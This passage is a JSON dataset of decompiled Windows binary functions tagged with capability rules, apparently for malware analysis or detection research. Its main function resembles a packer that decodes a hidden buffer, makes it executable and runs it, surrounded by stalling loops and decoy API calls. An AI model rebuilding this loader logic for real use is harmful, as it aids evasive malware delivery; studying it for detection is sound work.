{
    "null": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    int32_t in_FS_OFFSET;\n    uint uVar10;\n    uint arg_10h;\n    uint arg_14h;\n    char16_t *arg_18h;\n    ulong uVar11;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t lpPoint;\n    uint var_1ch;\n    uint lpflOldProtect;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t flNewProtect;\n    \n    // [00] -r-x section size 77824 named .text\n    var_30h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    if (var_54h == 0x159) {\n        pcVar4 = 0x41c8b0;\n        do {\n            pcVar7 = pcVar4;\n            pcVar4 = pcVar7 + 1;\n        } while (*pcVar7 != '\\0');\n        if (0x216 < pcVar7 + -0x41c8b0) {\n            (*_sym.imp.KERNEL32.dll_GetProcessShutdownParameters)(0, 0);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessWorkingSetSize;\n            (*_sym.imp.KERNEL32.dll_GetProcessWorkingSetSize)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetProcessWorkingSetSize)(0, 0, 0);\n            (*_sym.imp.USER32.dll_LoadImageA)(0, \"jeravamojobozujipanuwoso.jpg\", 0, 0, 0, 0);\n            (*_sym.imp.SHELL32.dll_SHGetNewLinkInfoW)(0, 0, 0, 0, 0);\n            (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0, 0, 0, 0, 0);\n            (*_sym.imp.WINHTTP.dll_WinHttpConnect)(0, 0, 0, 0);\n            (*_sym.imp.USER32.dll_ShowScrollBar)(0, 0, 0);\n            pcVar2 = _sym.imp.USER32.dll_EnableScrollBar;\n            (*_sym.imp.USER32.dll_EnableScrollBar)(0, 0, 0);\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetProcessId)(0);\n            if (iVar5 == 0) {\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n            }\n            (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)(0, 0);\n            (*_sym.imp.ADVAPI32.dll_OpenEventLogA)(0, 0);\n            (*_sym.imp.ADVAPI32.dll_LookupPrivilegeNameA)(0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetComputerNameExW)(0, 0);\n            (*_sym.imp.ADVAPI32.dll_GetSecurityDescriptorLength)(0);\n            (*_sym.imp.ADVAPI32.dll_GetSecurityDescriptorControl)(0, 0, 0);\n            (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(0, 0, 0, 0);\n            (*pcVar2)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetProcessAffinityMask)(0, 0);\n            (*pcVar1)(0, 0, 0);\n            (*_sym.imp.MSIMG32.dll_GradientFill)(0, 0, 0, 0, 0, 0);\n            fcn.00407569(0x41c8b0, 0, 0, var_10h);\n            var_24h = 0;\n            var_1ch = 0;\n            fcn.0040179d(1, 0);\n            fcn.004014d5(0, 0xffffffe8);\n            lpPoint = 0;\n            fcn.00405252(0);\n            fcn.0040524d(0);\n            fcn.004014f4(\"dejohukovi yito\");\n            fcn.00401a3a(0x41c8b0, \"%s %c %f\", 0x414230);\n            uVar11 = 0x41424000000000;\n            arg_18h = L\"sibefi sazafelegunamitiderulanacawawubi yofa\";\n            arg_14h = 0xcad;\n            arg_10h = 0x41ccb0;\n            puVar6 = fcn.00401a02();\n            uVar10 = *puVar6;\n            fcn.0040730d(uVar10, puVar6[1], arg_10h, arg_14h, arg_18h, uVar11, uVar11 >> 0x20);\n            fcn.00401a3a(0x41c8b0, \"nisarato sonafixi duzehone\", uVar10);\n            uVar10 = 0;\n            (*_sym.imp.USER32.dll_GetDC)();\n            (*_sym.imp.USER32.dll_BeginPaint)(0, 0, uVar10);\n            (*_sym.imp.MSIMG32.dll_TransparentBlt)(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);\n            (*_sym.imp.GDI32.dll_FillPath)(0);\n            fcn.0040179d(1, 0);\n            fcn.004017f2();\n        }\n    }\n    uVar3 = *0x41c010;\n    pcVar1 = _sym.imp.KERNEL32.dll_LoadLibraryW;\n    iVar8 = 0xbebfe3b;\n    var_10h = *0x41c010;\n    iVar5 = *0x41c8ac;\n    do {\n        if (iVar5 == 0) {\n            iVar5 = (*pcVar1)(L\"kernel32.dll\");\n            *0x41c8ac = iVar5;\n        }\n        iVar8 = iVar8 + -1;\n    } while (iVar8 != 0);\n    while( true ) {\n        (*_sym.imp.KERNEL32.dll_GetCPInfo)(0, &var_44h);\n        (*_sym.imp.KERNEL32.dll_GetCommTimeouts)(0, &var_58h);\n        (*_sym.imp.USER32.dll_GetCaretPos)(&lpPoint);\n        (*_sym.imp.KERNEL32.dll_GetMailslotInfo)(0, &lpflOldProtect, &var_8h, &var_14h, &var_ch);\n        if ((((0xf549b < iVar8) && (var_44h != 0x23b74f)) && (var_50h != 0x25caa81d)) &&\n           ((lpPoint != 0x1f9d86e7 && (var_8h != 0x1cecd011)))) break;\n        iVar8 = iVar8 + 2;\n        if (0x1653e7c < iVar8) {\ncode_r0x00401305:\n            pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n            var_ch = *0x41c000;\n            var_8h = *0x41c00c;\n            flNewProtect = 0x20;\n            uVar9 = 0;\n            if (uVar3 != 0) {\n                do {\n                    if (uVar9 == 0) {\n                        (*_sym.imp.KERNEL32.dll_DuplicateHandle)(0, 0, 0, 0, 0, 0, 0);\n                    }\n                    (*_sym.imp.KERNEL32.dll_EscapeCommFunction)(0, 0);\n                    (*_sym.imp.KERNEL32.dll_GetHandleInformation)(0, 0);\n                    (*pcVar1)();\n                    (*0x41d6bc)[uVar9] = *(var_8h + 0x932 + uVar9);\n                    if (uVar9 == 10) {\n                        (*_sym.imp.KERNEL32.dll_VirtualProtect)(*0x41d6bc, uVar3, flNewProtect * 2, &lpflOldProtect);\n                    }\n                    uVar9 = uVar9 + 1;\n                } while (uVar9 < uVar3);\n            }\n            fcn.0040149c(*0x41d6bc, &var_10h, var_ch);\n            (**0x41d6bc)();\n            (*pcVar1)();\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            (*_sym.imp.KERNEL32.dll_TerminateProcess)(0, 0);\n            *(*(*(in_FS_OFFSET + 0x2c) + *0x41d6c8 * 4) + 4) = 1;\n            fcn.004017f2();\n            return 0;\n        }\n    }\n    *0x41c8a8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"Kernel32.dll\");\n    fcn.0040525d(0xc81c50);\n    (*_sym.imp.KERNEL32.dll_lstrcpyA)(0x41c8b0, \"kernel\");\n    *0x41ccb0 = 0x4c;\n    *0x41c8b6 = 0x642e3233;\n    *0x41c8ba = 0x6c6c;\n    *0x41c8bc = 0;\n    *0x41ccb2 = 0;\n    *0x41c8a8 = (*pcVar1)(0x41ccb0);\n    *0x41d6bc = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, uVar3);\n    goto code_r0x00401305;\n}\n",
        "token_count": 2297
    },
    "004013e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004013e7(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *arg_8h;\n    for (; (cVar1 != '\\0' && (arg_ch != 0)); arg_ch = arg_ch + -1) {\n        arg_8h = arg_8h + 1;\n        iVar2 = iVar2 + 1;\n        cVar1 = *arg_8h;\n    }\n    return iVar2;\n}\n",
        "token_count": 131
    },
    "00401702": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401702(uint32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint *in_ECX;\n    \n    if (arg_8h != 0xffffffff) {\n        if (in_ECX[5] < arg_8h) {\n            in_EAX = fcn.0040159f(arg_8h, in_ECX[4]);\n        }\n        else if ((arg_ch == '\\0') || (0xf < arg_8h)) {\n            if (arg_8h == 0) {\n                in_ECX[4] = 0;\n                if (0xf < in_ECX[5]) {\n                    in_ECX = *in_ECX;\n                }\n                *in_ECX = 0;\n            }\n        }\n        else {\n            uVar2 = in_ECX[4];\n            if (arg_8h < in_ECX[4]) {\n                uVar2 = arg_8h;\n            }\n            in_EAX = fcn.0040179d(1, uVar2);\n        }\n        return in_EAX & 0xffffff00 | arg_8h != 0;\n    }\n    fcn.00401b7e(\"string too long\");\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 316
    },
    "004017f2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004017f2(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        fcn.004014d5(*param_1, param_1[1]);\n        fcn.004016b7(*param_1, (param_1[2] - *param_1) / 0x18, 0x18);\n        *param_1 = 0;\n        param_1[1] = 0;\n        param_1[2] = 0;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "004088c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004088c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x41e1c8, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00409b44();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00409acb(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00402422": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402422(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    piVar1 = *arg_8h;\n    if (((*piVar1 == -0x1f928c9d) && (piVar1[4] == 3)) &&\n       ((iVar2 = piVar1[5],  iVar2 == 0x19930520 ||\n        (((iVar2 == 0x19930521 || (iVar2 == 0x19930522)) || (iVar2 == 0x1994000)))))) {\n        fcn.0040882a();\n        pcVar3 = swi(3);\n        uVar4 = (*pcVar3)();\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 194
    },
    "00403ebe": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00403ebe(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    \n    *(unaff_EBX + -4) = *(unaff_EBP + -0x2c);\n    fcn.00403083(*(unaff_EBP + -0x30));\n    iVar1 = fcn.00403b76();\n    *(iVar1 + 0x10) = *(unaff_EBP + -0x34);\n    iVar1 = fcn.00403b76();\n    *(iVar1 + 0x14) = *(unaff_EBP + -0x38);\n    if (((((*unaff_EDI == -0x1f928c9d) && (unaff_EDI[4] == 3)) &&\n         ((unaff_EDI[5] == 0x19930520 || ((unaff_EDI[5] == 0x19930521 || (unaff_EDI[5] == 0x19930522)))))) &&\n        (*(unaff_EBP + -0x3c) == 0)) &&\n       ((*(unaff_EBP + -0x1c) != 0 && (iVar1 = fcn.004030cd(unaff_EDI[6]),  iVar1 != 0)))) {\n        fcn.00403cbc(unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "004047ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004047ca(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004024d0(0x41a1a8, 0x10);\n    if (*(*(unaff_EBP + 0x10) + 4) < 0x81) {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    else {\n        iVar4 = *(*(unaff_EBP + 8) + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar4;\n    iVar3 = fcn.00403b76();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while( true ) {\n        if (iVar4 == *(unaff_EBP + 0x14)) goto code_r0x0040485e;\n        if ((iVar4 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= iVar4)) break;\n        iVar1 = *(iVar3 + 8);\n        uVar2 = *(iVar1 + iVar4 * 8);\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + iVar4 * 8) != 0) {\n            iVar1 = *(unaff_EBP + 8);\n            *(iVar1 + 8) = uVar2;\n            fcn.00403c70(*(*(iVar3 + 8) + 4 + iVar4 * 8), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        iVar4 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = iVar4;\n    }\n    do {\n        fcn.0040882a();\ncode_r0x0040485e:\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040487e();\n    } while (iVar4 != *(unaff_EBP + 0x14));\n    *(*(unaff_EBP + 8) + 8) = iVar4;\n    fcn.00402516();\n    return;\n}\n",
        "token_count": 620
    },
    "0040487e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040487e(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403b76();\n    if (0 < *(iVar1 + 0x18)) {\n        iVar1 = fcn.00403b76();\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040526f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040526f(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41c028 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00409b44();\n        *puVar1 = 0x16;\n        fcn.004051ed();\n        goto code_r0x004053c0;\n    }\n    fcn.0040598a(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00405920(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    iVar2 = fcn.00405c1e();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00405398;\ncode_r0x004053e5:\n                    *(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x004053e5;\n                    goto code_r0x00405398;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00405398:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.00405a0d();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x004053c0:\n    fcn.004026d1(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 798
    },
    "004053eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004053eb(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41c028 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.00409b44();\n        *puVar1 = 0x16;\n        fcn.004051ed();\n        goto code_r0x00405542;\n    }\n    fcn.0040598a(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00405955(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    iVar2 = fcn.00405d3a();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00405517;\ncode_r0x00405567:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00405567;\n                    goto code_r0x00405517;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00405517:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.00405a0d();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00405542:\n    fcn.004026d1(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 799
    },
    "00405c1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __thiscall\nfcn.00405c1e(int32_t param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint32_t arg_8h;\n    uint uVar4;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    cVar1 = fcn.0040937c();\n    if (cVar1 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x00405c43:\n        puVar2 = fcn.00409b44();\n        *puVar2 = 0x16;\n        fcn.004051ed();\ncode_r0x00405c53:\n        uVar3 = 0xffffffff;\n    }\n    else {\ncode_r0x00405cfe:\n        *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n        if (*(param_1 + 0x450) != 2) {\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x00405ceb:\n            cVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x31) = cVar1;\n            if (cVar1 != '\\0') {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n                if (*(param_1 + 0x18) < 0) goto code_r0x00405cfe;\n                uVar3 = *(param_1 + 0x1c);\n                arg_8h = *(param_1 + 0x31);\n                uVar4 = fcn.00405aa2(arg_8h, uVar3);\n                *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x405d1a\n                switch(uVar4) {\n                case 0:\n                    cVar1 = fcn.00405ed4();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x00405ceb;\n                case 2:\n                    cVar1 = fcn.00405e5a();\n                    break;\n                case 3:\n                    cVar1 = fcn.0040677a();\n                    break;\n                case 4:\n                    goto code_r0x00405cc5;\n                case 5:\n                    cVar1 = fcn.00405fb8();\n                    break;\n                case 6:\n                    cVar1 = fcn.00406009();\n                    break;\n                case 7:\n                    cVar1 = fcn.004062ee(arg_8h, uVar3, arg_8h, unaff_ESI, unaff_retaddr, param_2, param_3, param_4, \n                                         param_5, param_6, param_7);\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x00405c53;\n                default:\n                    goto code_r0x00405c43;\n                }\n                if (cVar1 == '\\0') goto code_r0x00405c53;\n                goto code_r0x00405ceb;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n            goto code_r0x00405cfe;\n        }\n        uVar3 = *(param_1 + 0x18);\n    }\n    return uVar3;\ncode_r0x00405cc5:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x00405ceb;\n}\n",
        "token_count": 957
    },
    "00405d3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405d3a(int32_t param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    cVar2 = fcn.0040937c();\n    if (cVar2 == '\\0') {\n        return 0xffffffff;\n    }\n    if (*(param_1 + 0x10) == 0) {\ncode_r0x00405d5f:\n        puVar3 = fcn.00409b44();\n        *puVar3 = 0x16;\n        fcn.004051ed();\ncode_r0x00405d6f:\n        uVar4 = 0xffffffff;\n    }\n    else {\ncode_r0x00405e1f:\n        *(param_1 + 0x450) = *(param_1 + 0x450) + 1;\n        if (*(param_1 + 0x450) != 2) {\n            *(param_1 + 0x38) = 0;\n            *(param_1 + 0x1c) = 0;\ncode_r0x00405e08:\n            iVar1 = **(param_1 + 0x10);\n            *(param_1 + 0x32) = iVar1;\n            if (iVar1 != 0) {\n                *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n                if (*(param_1 + 0x18) < 0) goto code_r0x00405e1f;\n                uVar4 = fcn.00405ad4(*(param_1 + 0x32), *(param_1 + 0x1c));\n                *(param_1 + 0x1c) = uVar4;\n    // switch table (8 cases) at 0x405e3a\n                switch(uVar4) {\n                case 0:\n                    cVar2 = fcn.00405ef3();\n                    break;\n                case 1:\n                    *(param_1 + 0x28) = 0xffffffff;\n                    *(param_1 + 0x24) = 0;\n                    *(param_1 + 0x30) = 0;\n                    *(param_1 + 0x20) = 0;\n                    *(param_1 + 0x2c) = 0;\n                    *(param_1 + 0x3c) = 0;\n                    goto code_r0x00405e08;\n                case 2:\n                    cVar2 = fcn.00405e97();\n                    break;\n                case 3:\n                    cVar2 = fcn.004067a5();\n                    break;\n                case 4:\n                    goto code_r0x00405de2;\n                case 5:\n                    cVar2 = fcn.00405fe0();\n                    break;\n                case 6:\n                    cVar2 = fcn.00406172();\n                    break;\n                case 7:\n                    cVar2 = fcn.0040651d();\n                    break;\n                case 0xbad1abe1:\n                    goto code_r0x00405d6f;\n                default:\n                    goto code_r0x00405d5f;\n                }\n                if (cVar2 == '\\0') goto code_r0x00405d6f;\n                goto code_r0x00405e08;\n            }\n            *(param_1 + 0x10) = *(param_1 + 0x10) + 2;\n            goto code_r0x00405e1f;\n        }\n        uVar4 = *(param_1 + 0x18);\n    }\n    return uVar4;\ncode_r0x00405de2:\n    *(param_1 + 0x28) = 0;\n    goto code_r0x00405e08;\n}\n",
        "token_count": 844
    },
    "00406009": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00406009(uint32_t *param_1)\n\n{\n    uint32_t *arg_14h;\n    char *pcVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint arg_8h;\n    uint arg_ch;\n    uint uStack8;\n    \n    cVar4 = *(param_1 + 0x31);\n    if (cVar4 != 'F') {\n        if (cVar4 == 'N') {\n            if ((*param_1 & 8) == 0) {\n                param_1[7] = 8;\ncode_r0x00406041:\n                puVar5 = fcn.00409b44();\n                *puVar5 = 0x16;\n                fcn.004051ed();\n                return 0;\n            }\n        }\n        else {\n            if (param_1[0xb] != 0) goto code_r0x00406041;\n            if (cVar4 < 'k') {\n                if (cVar4 == 'j') {\n                    param_1[0xb] = 5;\n                }\n                else if (cVar4 == 'I') {\n                    pcVar1 = param_1[4];\n                    cVar4 = *pcVar1;\n                    if ((cVar4 == '3') && (pcVar1[1] == '2')) {\n                        param_1[0xb] = 10;\n                        param_1[4] = pcVar1 + 2;\n                    }\n                    else if ((cVar4 == '6') && (pcVar1[1] == '4')) {\n                        param_1[0xb] = 0xb;\n                        param_1[4] = pcVar1 + 2;\n                    }\n                    else if (((((cVar4 == 'd') || (cVar4 == 'i')) || (cVar4 == 'o')) ||\n                             ((cVar4 == 'u' || (cVar4 == 'x')))) || (cVar4 == 'X')) {\n                        param_1[0xb] = 9;\n                    }\n                }\n                else if (cVar4 == 'L') {\n                    param_1[0xb] = 8;\n                }\n                else if (cVar4 == 'T') {\n                    param_1[0xb] = 0xd;\n                }\n                else if (cVar4 == 'h') 